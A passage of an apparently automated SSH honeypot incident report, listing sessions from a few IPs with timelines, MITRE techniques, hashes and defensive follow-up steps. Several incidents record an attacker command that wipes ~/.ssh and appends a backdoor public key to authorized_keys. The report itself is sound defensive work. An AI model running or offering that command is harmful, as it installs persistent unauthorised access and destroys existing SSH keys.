| `2026-06-02 09:54:39` | `cowrie.command.failed` |
| `2026-06-02 09:54:39` | `cowrie.log.closed` |
| `2026-06-02 09:54:40` | `cowrie.session.params` |
| `2026-06-02 09:54:40` | `cowrie.command.input` |
| `2026-06-02 09:54:40` | `cowrie.session.file_download` |
| `2026-06-02 09:54:40` | `cowrie.log.closed` |
| `2026-06-02 09:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756cca989a87

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:54 |
| **Last Seen** | 2026-06-02 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:54:42` | `cowrie.session.connect` |
| `2026-06-02 09:54:42` | `cowrie.client.version` |
| `2026-06-02 09:54:42` | `cowrie.client.kex` |
| `2026-06-02 09:54:43` | `cowrie.login.success` |
| `2026-06-02 09:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35d52a238cb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:58 |
| **Last Seen** | 2026-06-02 09:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:58:16` | `cowrie.session.connect` |
| `2026-06-02 09:58:16` | `cowrie.client.version` |
| `2026-06-02 09:58:16` | `cowrie.client.kex` |
| `2026-06-02 09:58:16` | `cowrie.login.success` |
| `2026-06-02 09:58:16` | `cowrie.session.params` |
| `2026-06-02 09:58:16` | `cowrie.command.input` |
| `2026-06-02 09:58:16` | `cowrie.command.failed` |
| `2026-06-02 09:58:17` | `cowrie.log.closed` |
| `2026-06-02 09:58:17` | `cowrie.session.params` |
| `2026-06-02 09:58:17` | `cowrie.command.input` |
| `2026-06-02 09:58:17` | `cowrie.session.file_download` |
| `2026-06-02 09:58:17` | `cowrie.log.closed` |
| `2026-06-02 09:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a827a41f2b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:58 |
| **Last Seen** | 2026-06-02 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:58:19` | `cowrie.session.connect` |
| `2026-06-02 09:58:19` | `cowrie.client.version` |
| `2026-06-02 09:58:19` | `cowrie.client.kex` |
| `2026-06-02 09:58:19` | `cowrie.login.success` |
| `2026-06-02 09:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c37f970011

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:59 |
| **Last Seen** | 2026-06-02 09:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:59:02` | `cowrie.session.connect` |
| `2026-06-02 09:59:02` | `cowrie.client.version` |
| `2026-06-02 09:59:02` | `cowrie.client.kex` |
| `2026-06-02 09:59:03` | `cowrie.login.success` |
| `2026-06-02 09:59:03` | `cowrie.session.params` |
| `2026-06-02 09:59:03` | `cowrie.command.input` |
| `2026-06-02 09:59:03` | `cowrie.command.failed` |
| `2026-06-02 09:59:04` | `cowrie.log.closed` |
| `2026-06-02 09:59:04` | `cowrie.session.params` |
| `2026-06-02 09:59:04` | `cowrie.command.input` |
| `2026-06-02 09:59:04` | `cowrie.session.file_download` |
| `2026-06-02 09:59:04` | `cowrie.log.closed` |
| `2026-06-02 09:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1abf17907eac

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:59 |
| **Last Seen** | 2026-06-02 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:59:06` | `cowrie.session.connect` |
| `2026-06-02 09:59:06` | `cowrie.client.version` |
| `2026-06-02 09:59:06` | `cowrie.client.kex` |
| `2026-06-02 09:59:07` | `cowrie.login.success` |
| `2026-06-02 09:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2660326d650c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:59 |
| **Last Seen** | 2026-06-02 09:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:59:48` | `cowrie.session.connect` |
| `2026-06-02 09:59:48` | `cowrie.client.version` |
| `2026-06-02 09:59:48` | `cowrie.client.kex` |
| `2026-06-02 09:59:48` | `cowrie.login.success` |
| `2026-06-02 09:59:49` | `cowrie.session.params` |
| `2026-06-02 09:59:49` | `cowrie.command.input` |
| `2026-06-02 09:59:49` | `cowrie.command.failed` |
| `2026-06-02 09:59:49` | `cowrie.log.closed` |
| `2026-06-02 09:59:49` | `cowrie.session.params` |
| `2026-06-02 09:59:49` | `cowrie.command.input` |
| `2026-06-02 09:59:49` | `cowrie.session.file_download` |
| `2026-06-02 09:59:49` | `cowrie.log.closed` |
| `2026-06-02 09:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f66d4dba629

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:59 |
| **Last Seen** | 2026-06-02 09:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:59:51` | `cowrie.session.connect` |
| `2026-06-02 09:59:51` | `cowrie.client.version` |
| `2026-06-02 09:59:51` | `cowrie.client.kex` |
| `2026-06-02 09:59:51` | `cowrie.login.success` |
| `2026-06-02 09:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8664863a6da2

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:00 |
| **Last Seen** | 2026-06-02 10:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:00:28` | `cowrie.session.connect` |
| `2026-06-02 10:00:28` | `cowrie.client.version` |
| `2026-06-02 10:00:29` | `cowrie.client.kex` |
| `2026-06-02 10:00:29` | `cowrie.login.success` |
| `2026-06-02 10:00:29` | `cowrie.session.params` |
| `2026-06-02 10:00:29` | `cowrie.command.input` |
| `2026-06-02 10:00:29` | `cowrie.command.failed` |
| `2026-06-02 10:00:30` | `cowrie.log.closed` |
| `2026-06-02 10:00:30` | `cowrie.session.params` |
| `2026-06-02 10:00:30` | `cowrie.command.input` |
| `2026-06-02 10:00:30` | `cowrie.session.file_download` |
| `2026-06-02 10:00:30` | `cowrie.log.closed` |
| `2026-06-02 10:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a50a286bd83

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:00 |
| **Last Seen** | 2026-06-02 10:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:00:32` | `cowrie.session.connect` |
| `2026-06-02 10:00:32` | `cowrie.client.version` |
| `2026-06-02 10:00:33` | `cowrie.client.kex` |
| `2026-06-02 10:00:33` | `cowrie.login.success` |
| `2026-06-02 10:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313f744ea218

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:03 |
| **Last Seen** | 2026-06-02 10:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:03:23` | `cowrie.session.connect` |
| `2026-06-02 10:03:23` | `cowrie.client.version` |
| `2026-06-02 10:03:23` | `cowrie.client.kex` |
| `2026-06-02 10:03:24` | `cowrie.login.success` |
| `2026-06-02 10:03:24` | `cowrie.session.params` |
| `2026-06-02 10:03:24` | `cowrie.command.input` |
| `2026-06-02 10:03:24` | `cowrie.command.failed` |
| `2026-06-02 10:03:25` | `cowrie.log.closed` |
| `2026-06-02 10:03:25` | `cowrie.session.params` |
| `2026-06-02 10:03:25` | `cowrie.command.input` |
| `2026-06-02 10:03:25` | `cowrie.session.file_download` |
| `2026-06-02 10:03:25` | `cowrie.log.closed` |
| `2026-06-02 10:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922443df2b35

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:03 |
| **Last Seen** | 2026-06-02 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:03:28` | `cowrie.session.connect` |
| `2026-06-02 10:03:28` | `cowrie.client.version` |
| `2026-06-02 10:03:28` | `cowrie.client.kex` |
| `2026-06-02 10:03:29` | `cowrie.login.success` |
| `2026-06-02 10:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3741ba702171

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:03 |
| **Last Seen** | 2026-06-02 10:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:03:32` | `cowrie.session.connect` |
| `2026-06-02 10:03:32` | `cowrie.client.version` |
| `2026-06-02 10:03:32` | `cowrie.client.kex` |
| `2026-06-02 10:03:33` | `cowrie.login.success` |
| `2026-06-02 10:03:34` | `cowrie.session.params` |
| `2026-06-02 10:03:34` | `cowrie.command.input` |
| `2026-06-02 10:03:34` | `cowrie.command.failed` |
| `2026-06-02 10:03:34` | `cowrie.log.closed` |
| `2026-06-02 10:03:34` | `cowrie.session.params` |
| `2026-06-02 10:03:34` | `cowrie.command.input` |
| `2026-06-02 10:03:35` | `cowrie.session.file_download` |
| `2026-06-02 10:03:35` | `cowrie.log.closed` |
| `2026-06-02 10:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29f64258b036

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:03 |
| **Last Seen** | 2026-06-02 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:03:37` | `cowrie.session.connect` |
| `2026-06-02 10:03:37` | `cowrie.client.version` |
| `2026-06-02 10:03:37` | `cowrie.client.kex` |
| `2026-06-02 10:03:38` | `cowrie.login.success` |
| `2026-06-02 10:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac85a27f37b

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:04 |
| **Last Seen** | 2026-06-02 10:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:04:55` | `cowrie.session.connect` |
| `2026-06-02 10:04:55` | `cowrie.client.version` |
| `2026-06-02 10:04:55` | `cowrie.client.kex` |
| `2026-06-02 10:04:56` | `cowrie.login.success` |
| `2026-06-02 10:04:57` | `cowrie.session.params` |
| `2026-06-02 10:04:57` | `cowrie.command.input` |
| `2026-06-02 10:04:57` | `cowrie.command.failed` |
| `2026-06-02 10:04:57` | `cowrie.log.closed` |
| `2026-06-02 10:04:57` | `cowrie.session.params` |
| `2026-06-02 10:04:57` | `cowrie.command.input` |
| `2026-06-02 10:04:57` | `cowrie.session.file_download` |
| `2026-06-02 10:04:57` | `cowrie.log.closed` |
| `2026-06-02 10:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17566227f496

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:05 |
| **Last Seen** | 2026-06-02 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:05:00` | `cowrie.session.connect` |
| `2026-06-02 10:05:00` | `cowrie.client.version` |
| `2026-06-02 10:05:00` | `cowrie.client.kex` |
| `2026-06-02 10:05:01` | `cowrie.login.success` |
| `2026-06-02 10:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2662c7633d76

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:07 |
| **Last Seen** | 2026-06-02 10:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:07:55` | `cowrie.session.connect` |
| `2026-06-02 10:07:55` | `cowrie.client.version` |
| `2026-06-02 10:07:56` | `cowrie.client.kex` |
| `2026-06-02 10:07:57` | `cowrie.login.success` |
| `2026-06-02 10:07:57` | `cowrie.session.params` |
| `2026-06-02 10:07:57` | `cowrie.command.input` |
| `2026-06-02 10:07:57` | `cowrie.command.failed` |
| `2026-06-02 10:07:57` | `cowrie.log.closed` |
| `2026-06-02 10:07:58` | `cowrie.session.params` |
| `2026-06-02 10:07:58` | `cowrie.command.input` |
| `2026-06-02 10:07:58` | `cowrie.session.file_download` |
| `2026-06-02 10:07:58` | `cowrie.log.closed` |
| `2026-06-02 10:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0264522cb6

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:08 |
| **Last Seen** | 2026-06-02 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:08:01` | `cowrie.session.connect` |
| `2026-06-02 10:08:01` | `cowrie.client.version` |
| `2026-06-02 10:08:01` | `cowrie.client.kex` |
| `2026-06-02 10:08:02` | `cowrie.login.success` |
| `2026-06-02 10:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6c19404780

| Field | Detail |
|---|---|
